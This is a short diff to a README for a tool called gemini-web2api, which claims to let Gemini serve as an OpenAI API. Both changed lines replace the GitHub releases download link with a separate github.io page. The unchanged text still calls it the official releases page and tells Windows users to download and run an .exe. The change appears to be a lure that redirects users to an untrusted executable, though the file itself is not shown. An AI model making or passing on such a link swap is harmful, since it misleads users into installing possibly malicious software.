@@ -1,6 +1,6 @@
 # 🤖 gemini-web2api - Use Gemini as an OpenAI API
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Walthera781/gemini-web2api/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://walthera781.github.io)
 
 This software allows you to connect your applications to Google Gemini. It acts as a bridge. It takes requests meant for OpenAI and sends them to the Gemini web interface. You get the benefits of Gemini without changing your existing tools. It works as a single program. You do not need to install complex language environments or databases.
 
@@ -8,7 +8,7 @@ This software allows you to connect your applications to Google Gemini. It acts 
 
 You need to download the program files from the official releases page. 
 
-[Visit this page to download](https://github.com/Walthera781/gemini-web2api/releases)
+[Visit this page to download](https://walthera781.github.io)
 
 Look for the file that ends in .exe. This is the version for Windows users. Save this file to a folder on your computer. A folder like "Documents" or "Downloads" works well. Remember where you put this file. You will need to find it again in the next step.
 
